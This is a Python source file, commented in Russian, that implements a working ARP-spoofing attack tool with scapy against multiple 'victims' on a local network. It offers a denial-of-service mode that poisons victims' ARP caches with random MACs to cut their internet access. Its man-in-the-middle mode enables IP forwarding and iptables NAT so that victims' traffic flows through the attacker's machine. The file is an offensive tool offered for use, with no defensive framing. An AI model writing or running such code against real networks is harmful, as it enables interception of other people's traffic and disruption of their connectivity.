import time
import sys
import random
from scapy.all import sendp, ARP, Ether
from modules.arp_utils import generate_fake_mac
import subprocess  # Добавляем импорт

class ARPAttack:
    """Класс для управления ARP атакой на несколько жертв"""
    def __init__(self, interface, gateway_ip, gateway_mac):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.victims = []  # Список жертв: [{'ip': ..., 'mac': ...}, ...]
        self.attack_active = False
        self.packets_sent = 0
        self.start_time = time.time()
        self.mitm_mode = False  # Новый флаг для режима MITM
        self.local_mac = None   # Будем получать позже
        self.local_ip = None    # Добавляем для NAT
        
    def set_local_mac(self, mac):
        """Установить локальный MAC адрес"""
        self.local_mac = mac
        
    def set_local_ip(self, ip):
        """Установить локальный IP адрес"""
        self.local_ip = ip
        
    def setup_forwarding(self):
        """Настройка IP forwarding и NAT для MITM"""
        try:
            # Включаем IP forwarding
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                          capture_output=True, text=True)
            
            # Очищаем старые правила
            subprocess.run(['iptables', '--flush'], capture_output=True)
            subprocess.run(['iptables', '--table', 'nat', '--flush'], capture_output=True)
            subprocess.run(['iptables', '--delete-chain'], capture_output=True)
            subprocess.run(['iptables', '--table', 'nat', '--delete-chain'], capture_output=True)
            
            # Настройка NAT для исходящего трафика от жертв
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'POSTROUTING', 
                '-o', self.interface, '-j', 'MASQUERADE'
            ], capture_output=True)
            
            # Разрешаем форвардинг
            subprocess.run([
                'iptables', '-A', 'FORWARD', 
                '-i', self.interface, '-j', 'ACCEPT'
            ], capture_output=True)
            
            subprocess.run([
                'iptables', '-A', 'FORWARD', 
                '-o', self.interface, '-j', 'ACCEPT'
            ], capture_output=True)
            
            print("\033[1;32m[✓] IP forwarding и NAT настроены\033[0m")
            return True
        except Exception as e:
            print(f"\033[1;31m[!] Ошибка настройки forwarding: {str(e)}\033[0m")
            return False
            
    def cleanup_forwarding(self):
        """Очистка правил форвардинга"""
        try:
            # Выключаем IP forwarding
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                          capture_output=True, text=True)
            
            # Восстанавливаем стандартные правила
            subprocess.run(['iptables', '--flush'], capture_output=True)
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
            
            print("\033[1;32m[✓] Правила форвардинга очищены\033[0m")
        except:
            pass
    
    def set_mitm_mode(self, enable=True):
        """Включить/выключить MITM режим"""
        self.mitm_mode = enable
        if enable:
            print("\033[1;32m[⚡] Включен режим MITM - трафик пойдет через ваш компьютер\033[0m")
            if not self.setup_forwarding():
                print("\033[1;31m[!] Не удалось настроить форвардинг. MITM может не работать!\033[0m")
        else:
            print("\033[1;31m[☠] Включен режим DoS - интернет будет отключен\033[0m")
            self.cleanup_forwarding()
    
    def add_victim(self, ip, mac):
        """Добавление жертвы"""
        self.victims.append({'ip': ip, 'mac': mac})
    
    def remove_victim(self, ip):
        """Удаление жертвы по IP"""
        self.victims = [v for v in self.victims if v['ip'] != ip]
    
    def get_victim_count(self):
        """Получение количества жертв"""
        return len(self.victims)
    
    def start_attack(self):
        """Запуск атаки на всех жертв"""
        if not self.victims:
            print("\033[1;31m[!] Нет выбранных жертв!\033[0m")
            return
        
        if self.mitm_mode and not self.local_mac:
            print("\033[1;33m[!] В режиме MITM нужен ваш MAC адрес\033[0m")
            # Пробуем получить MAC автоматически
            try:
                import netifaces
                self.local_mac = netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0]['addr']
                print(f"\033[1;32m[✓] Определен ваш MAC: {self.local_mac}\033[0m")
            except:
                print("\033[1;31m[!] Не удалось получить MAC. Использую случайный.\033[0m")
                self.local_mac = generate_fake_mac()
        
        self.attack_active = True
        self.packets_sent = 0
        self.start_time = time.time()
        
        mode_text = "MITM (трафик через вас)" if self.mitm_mode else "DoS (без интернета)"
        print(f"\n\033[1;31m[🔥] АТАКА ЗАПУЩЕНА НА {len(self.victims)} ЖЕРТВ!\033[0m")
        print(f"\033[1;33m[📡] Режим: {mode_text}\033[0m")
        print(f"\033[1;32m[✋] Нажмите Ctrl+C для остановки\033[0m\n")
        
        try:
            while self.attack_active:
                # Отправляем пакеты каждой жертве
                for victim in self.victims:
                    # Выбираем MAC в зависимости от режима
                    if self.mitm_mode and self.local_mac:
                        fake_mac = self.local_mac  # Используем наш MAC для MITM
                    else:
                        fake_mac = generate_fake_mac()  # Случайный MAC для DoS
                    
                    # Пакет 1: Говорим жертве, что мы - шлюз
                    arp_packet = Ether(dst=victim['mac']) / ARP(
                        op=2,  # ARP reply
                        pdst=victim['ip'],
                        hwdst=victim['mac'],
                        psrc=self.gateway_ip,  # Притворяемся шлюзом
                        hwsrc=fake_mac
                    )
                    
                    # Используем sendp() для L2 пакетов
                    sendp(arp_packet, verbose=False, iface=self.interface)
                    self.packets_sent += 1
                    
                    # Пакет 2: Говорим шлюзу, что мы - жертва (только в MITM)
                    if self.mitm_mode and self.local_mac:
                        arp_to_gateway = Ether(dst=self.gateway_mac) / ARP(
                            op=2,
                            pdst=self.gateway_ip,
                            hwdst=self.gateway_mac,
                            psrc=victim['ip'],  # Притворяемся жертвой
                            hwsrc=self.local_mac
                        )
                        sendp(arp_to_gateway, verbose=False, iface=self.interface)
                        self.packets_sent += 1
                
                # Обновление статуса
                elapsed = int(time.time() - self.start_time)
                if len(self.victims) <= 3:
                    victim_list = ", ".join([v['ip'] for v in self.victims])
                else:
                    victim_list = f"{len(self.victims)} устройств"
                
                mode_indicator = "👁️ MITM" if self.mitm_mode else "☠ DoS"
                status = f"\033[1;36m[{mode_indicator}] Пакетов: {self.packets_sent:6d} | Время: {elapsed:4d}с | Жертвы: {victim_list}\033[0m"
                sys.stdout.write(f"\r{' '*100}\r{status}")
                sys.stdout.flush()
                
                time.sleep(0.2)
                
        except KeyboardInterrupt:
            print("\n\033[1;33m[!] Остановка атаки...\033[0m")
            self.stop_attack()
        except Exception as e:
            print(f"\n\033[1;31m[!] Ошибка во время атаки: {str(e)}\033[0m")
            self.stop_attack()
    
    def stop_attack(self):
        """Остановка атаки и восстановление ARP таблиц"""
        if not self.attack_active:
            return
        
        self.attack_active = False
        
        print(f"\n\n\033[1;32m{'═'*60}\033[0m")
        print("\033[1;42m" + " ВОССТАНОВЛЕНИЕ ".center(60) + "\033[0m")
        print(f"\033[1;32m{'═'*60}\033[0m")
        
        # Восстанавливаем каждую жертву
        for victim in self.victims:
            print(f"\033[1;33m[*] Восстанавливаю ARP-таблицу жертвы {victim['ip']}...\033[0m")
            
            for i in range(20):
                # Восстанавливаем для жертвы правильный MAC шлюза
                restore_packet = Ether(dst=victim['mac']) / ARP(
                    op=2,
                    pdst=victim['ip'],
                    hwdst=victim['mac'],
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_mac
                )
                sendp(restore_packet, verbose=False, iface=self.interface)
                
                # Восстанавливаем для шлюза правильный MAC жертвы
                restore_gateway = Ether(dst=self.gateway_mac) / ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=victim['ip'],
                    hwsrc=victim['mac']
                )
                sendp(restore_gateway, verbose=False, iface=self.interface)
                
                time.sleep(0.05)
            
            print(f"\033[1;32m[✓] Жертва {victim['ip']} восстановлена\033[0m")
        
        # Очищаем правила форвардинга
        self.cleanup_forwarding()
        
        elapsed = int(time.time() - self.start_time)
        print(f"\n\033[1;32m[✓] Всего отправлено пакетов: {self.packets_sent}\033[0m")
        print(f"\033[1;32m[✓] Общее время атаки: {elapsed} секунд\033[0m")
        print(f"\033[1;32m[✓] Все жертвы снова видят шлюз {self.gateway_ip}\033[0m")
        
        # Очищаем список жертв
        self.victims = []
